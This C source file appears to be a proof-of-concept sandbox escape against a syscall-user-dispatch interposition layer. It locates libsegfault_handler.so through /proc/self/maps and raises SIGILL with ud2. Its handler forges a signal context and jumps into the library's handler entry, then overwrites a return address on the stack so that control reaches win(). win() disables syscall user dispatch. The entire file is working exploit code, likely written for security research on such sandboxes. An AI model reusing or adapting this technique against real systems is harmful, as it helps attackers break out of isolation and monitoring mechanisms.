#define _GNU_SOURCE
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <ucontext.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <sys/mman.h>

#include "_libattack.h"


#define ALTSTACK_SIZE (1024*1024*32)
#define PAGE_SIZE (4096)
#define PAGE_MASK (~(PAGE_SIZE - 1))

#define ENTRY_OFFSET 12092 
#define STACK_OFFSET 24288 

void* entry_addr = nullptr;

static unsigned char entry_pattern[64] = {
    0x49,0x89,0xd0,0x48,0x31,0xd2,0x48,0x31,
    0xc9,0xb8,0xf0,0xff,0xff,0x7f,0x0f,0x01,
    0xef,0x3d,0xf0,0xff,0xff,0x7f,0x74,0x03,
    0x0f,0x0b,0xcc,0x4c,0x89,0xc2,0x4d,0x31,
    0xc0,0x65,0x44,0x8a,0x04,0x25,0x10,0x00,
    0x00,0x00,0x41,0x80,0xf8,0x00,0x74,0x46,
    0x49,0x89,0xe2,0x49,0x83,0xc2,0x08,0x49,
    0x81,0xc2,0xa0,0x00,0x00,0x00,0x4d,0x8b
};



void win() {
    disable_sud();
    sud_test();
    exit(0);
}


void* find_segfault_handler(){
    FILE *maps_file = fopen("/proc/self/maps", "r");

    if (maps_file == NULL) {
        fprintf(stderr, "could not open proc/self/maps\n");
        exit(1);
    }

    char* end_ptr;
    char line[256];
    while (fgets(line, sizeof(line), maps_file) != NULL) {
        fprintf(stderr, "%s", line);
        end_ptr = line;
        if (!*end_ptr) continue;
        //star_adress-end_adress rwxp ....
        uint64_t mapping_start = strtoll(end_ptr, &end_ptr, 16);
        if(mapping_start>=0x7fffffffffffffff)continue; //ignore vsyscall pages
        uint64_t mapping_end = strtoll(end_ptr, &end_ptr, 16);
        char* page_permissions = strchr(line, ' ');
        page_permissions++;


        if(strstr(line, "libsegfault_handler.so")!=0){
            if(*(page_permissions+2)=='x'){
                return (void*)mapping_start;
            };
        }



    }

    return nullptr;
}

int flag = 0;


void handle_sigill(int signo, siginfo_t* info, void* ucontextv) {

    char* temp_stack = (char*)mmap(0, PAGE_SIZE*16, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    siginfo_t u_info;
    ucontext_t u_context;
    u_context.uc_mcontext.gregs[REG_RSP] = (size_t)(temp_stack + PAGE_SIZE*8);

    void* new_u_cont = memcpy((temp_stack+PAGE_SIZE*14), &u_context, sizeof(ucontext_t));
    void* new_u_info = memcpy((temp_stack+PAGE_SIZE*14)+sizeof(ucontext_t), &u_info, sizeof(siginfo_t));

    printf("sigill started\n");
    if(flag == 0){
        flag = 1;
    }else{
        printf("sigill handled\n");
    asm volatile(
        "push %%r11\n\t"
        "mov %%rsp, %%r11\n\t"
        "add %[off], %%r11\n\t"
        "mov %[target], %%rax\n\t"
        "mov %%rax, (%%r11)\n\t"
        "pop %%r11\n\t"
        :
        : [off] "r"((long)STACK_OFFSET),
        [target] "r"(win)
        : "rax", "r11", "memory", "cc"
    );
        return;
    }
    asm("movq %[ucontext], %%rsp\n"
        "subq $8, %%rsp\n"
        "movq %[ucontext], %%rsi\n"
        "movq %[info], %%rdx\n"
        "movq $4, %%rdi\n"
        "jmp *%[entry]"
        :
        :[ucontext]"r"(new_u_cont), [entry]"r"(entry_addr), [info]"r"(new_u_info)
    );
}

int main() {
    entry_addr = ((char*)find_segfault_handler()) + ENTRY_OFFSET;
    printf("entry addr = %p\n", entry_addr);
    assert(entry_addr != 0);

    struct sigaction act = {};
    act.sa_sigaction = handle_sigill;
    act.sa_flags |= SA_SIGINFO|SA_ONSTACK;
    sigaction(SIGILL, &act, NULL);

    asm("ud2");

    return 0;
}